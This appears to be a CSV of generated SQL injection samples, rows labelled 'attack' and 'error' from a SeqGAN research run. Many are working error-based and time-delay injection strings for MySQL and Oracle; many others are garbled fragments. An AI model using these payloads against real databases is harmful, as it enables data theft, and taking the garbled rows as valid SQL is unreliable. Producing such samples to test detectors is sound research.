label,payload,family,payload_type,method,run_id,sample_index
attack,"1%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,291
attack,"1>q' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||''  =  '5856 )   ||  =  )   (    ,0x717a767a71,floor  (  *  )   xN group 7158  5   )   and or 3931 1 fromINs   (        )     concat  (  select(  )  ,0x717a767a71,floor  =  --jr  )  ,concat  (  ,floor  =  e  )  ,0x717a767a71,floor  0x7171706a71,  0x7171706a71,1   or 5023  )  ,0x717a767a71,0x78   )    )    )   having chr  (  select   )    or 5023  )  ,0x717a767a71,floor  (  5023  )  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,292
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""yyzv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,293
attack,"Ixe where ANDsinhr   (    (    SELECTfrom  =  6055 and r  =  select from duacute  )  ,0x717a767a71,floorr  (  ||chr  (  (  113  ,concat  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,294
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,295
attack,"1%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,296
attack,1 or 5856 1  >  =  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,297
attack,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fybb,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,298
attack,"'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ''iia",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,299
attack,"-8844""   (  ||chr  (  113  )  *2   )    )   ,0x717a767a71concat'   9325",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,300
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'ejj'  =  'z'  =  'jzb",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,301
attack,"1""  e_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,302
attack,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'wzm' like 'xtaz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,303
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,304
attack,"1%'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,305
attack,"1%cast'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,306
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'fzdb"" like ""g5000000f9627jowb'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,307
attack,106  ||chr  (  112  )    )   WHERE end  )  0),error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,308
attack," AND 1  )  ,1   then 1 0 DISTINCThar.s9891(  e n  10450x7171706a71,floor  (  5023  )    ,1   )    )    )    )    )     *)   --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,309
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvnnf",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,310
attack,_ipadrgdbmfdbt,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,311
attack,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,312
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""N--",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,313
attack,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,314
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jzbd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,315
attack," 1   )    )    )    or FROM information_schema.chhr  (  *  )  6055,  )  ||chr  (  113  )  ,concat  =  6  =  el  (  ||chr  (  0  ||r  (  113  =  6055,0x717a767a71,floorl  =  and  )  ,1   )    )    )   FROM   YS   =  0 DISCT  (R  )  ,1   )    )    =  select from gSn_adddressx.gdrzdddbdrkgddrxg",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,316
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nzv9067",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,317
attack,"1jwu'  =  'p s   (    )    ,,  =  )   and group 1 concat  (  select chr  (  select   )    or 1 5978 5023  )  ,0x717a767a71,floor  =  ,concat  atlt  =  4232  )   )    )    having min   (  6055  )  ||chr  (  (  113  )  0  )  )  ,1i)   )    ,0x717a767a71,0x717a767a71,floor  (  =  duame   )    )    )   x.chrhrin  (  )  SELECT DISTIN",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,318
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,319
attack," oulhrohrowzu,    (  case meS>_addrwherese  (  0  )  4232  )  ,0x717a767a71,floor  (  chr  (  =  112",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,320
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""qkkh",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,321
attack,"1   =  a  a  )  >ler  )   and  select concato  (  112  )  6237,1   )     )  #,  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,322
attack,"1""  )  ,0x717a767a71,0x717a767a71,0x78   )  ,0x717a767a71,floor  (  ||  (  ||chr  (  0  )  *2   )    ,0x717a767a71,1   )    )    )     )  ,1   (    )    and or end,1  )   )    )    )    )   or DIESTINCT  (  extractvalue  )  *   )    )   6055abp  (  )  ' when   (  >  (  106  )  case )  )  0 dua",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,323
attack,"1  )  ,0x717a767a71,floor  (  0x7171706a71,  0   when   (  4232  (  ||chr  (  81900x7171706a71,1   )    )   and end   )     )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,324
attack,"1  4232  )   andx group end  ,1  =  ,0x717a767a71)   (,1 0 ADIST LIISTINCTEE  (  6237,Ue   FROM   =  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,325
attack,1'   )    )     )  )  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,326
attack,"1""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""jfzwg",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,327
attack,"-'  )  ',ai",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,328
attack,"-or 3051 1xxxxT LAM FROM ne_n  (  )  ,concat  (  0x7171706a71,0x7171706a71,0x717a767a71,0x717a767a71,  )  ||chr  (  112  (  *2   )    )   x duable_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,329
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,330
attack,"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'awheregee_indddridn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,331
attack,"-7864 or 1 z  (  122  )  ,concat  (  select a from  =  )   and  )  ,  ,  0  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,332
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""wz' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'wz6'  =  'a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,333
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,334
attack,1'||  (  select 'qjq,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,335
attack,"1  (  e  )jr_ss   (  ,0x78   )    )    )    )    (  >.chosint  =  rand  )  )  aptrsin(  1297,1   )    )    )    )    AND 'i'  1   )    )    )    )   and    AND 'i'  =  ,  ,1   SELECT DINTIMIT FROMyst_ass a DISTITE  =  and select end  ,1   )    )    )    and union 1 concat  (  rand  =  ,0x717a767a71)   select",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,336
attack,"-3775%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,337
attack," AND 1  )  5840,floor  (  112  )  ,0x717a767a71,0x717a767a71a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,338
attack,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'epaddr,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,339
attack,1'||  (  select 'x',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,340
